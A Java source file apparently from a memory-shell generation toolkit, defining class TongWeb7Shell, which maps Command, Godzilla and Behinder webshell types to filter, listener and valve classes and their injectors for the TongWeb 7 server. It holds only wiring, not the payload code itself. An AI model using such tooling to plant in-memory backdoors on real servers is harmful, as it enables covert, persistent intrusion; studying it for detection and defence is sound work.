package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.tomcat.behinder.BehinderListener;
import com.reajason.javaweb.memshell.tomcat.command.CommandListener;
import com.reajason.javaweb.memshell.tomcat.godzilla.GodzillaListener;
import com.reajason.javaweb.memshell.tongweb.behinder.BehinderValve7;
import com.reajason.javaweb.memshell.tongweb.command.CommandValve7;
import com.reajason.javaweb.memshell.tongweb.godzilla.GodzillaValve7;
import com.reajason.javaweb.memshell.tongweb.injector.TongWebFilterInjector;
import com.reajason.javaweb.memshell.tongweb.injector.TongWebListenerInjector;
import com.reajason.javaweb.memshell.tongweb.injector.TongWebValveInjector;
import org.apache.commons.lang3.tuple.Pair;

import java.util.Map;

import static com.reajason.javaweb.memshell.config.Constants.*;

/**
 * @author ReaJason
 * @since 2024/12/26
 */
public class TongWeb7Shell extends AbstractShell {
    public static final String VALVE = "Valve";
    public static final String JAKARTA_VALVE = "JakartaValve";

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        return Map.of(
                FILTER, Pair.of(CommandFilter.class, TongWebFilterInjector.class),
                JAKARTA_FILTER, Pair.of(CommandFilter.class, TongWebFilterInjector.class),
                LISTENER, Pair.of(CommandListener.class, TongWebListenerInjector.class),
                JAKARTA_LISTENER, Pair.of(CommandListener.class, TongWebListenerInjector.class),
                VALVE, Pair.of(CommandValve7.class, TongWebValveInjector.class),
                JAKARTA_VALVE, Pair.of(CommandValve7.class, TongWebValveInjector.class)
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        return Map.of(
                FILTER, Pair.of(GodzillaFilter.class, TongWebFilterInjector.class),
                JAKARTA_FILTER, Pair.of(GodzillaFilter.class, TongWebFilterInjector.class),
                LISTENER, Pair.of(GodzillaListener.class, TongWebListenerInjector.class),
                JAKARTA_LISTENER, Pair.of(GodzillaListener.class, TongWebListenerInjector.class),
                VALVE, Pair.of(GodzillaValve7.class, TongWebValveInjector.class),
                JAKARTA_VALVE, Pair.of(GodzillaValve7.class, TongWebValveInjector.class)
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
        return Map.of(
                FILTER, Pair.of(BehinderFilter.class, TongWebFilterInjector.class),
                JAKARTA_FILTER, Pair.of(BehinderFilter.class, TongWebFilterInjector.class),
                LISTENER, Pair.of(BehinderListener.class, TongWebListenerInjector.class),
                JAKARTA_LISTENER, Pair.of(BehinderListener.class, TongWebListenerInjector.class),
                VALVE, Pair.of(BehinderValve7.class, TongWebValveInjector.class),
                JAKARTA_VALVE, Pair.of(BehinderValve7.class, TongWebValveInjector.class)
        );
    }
}
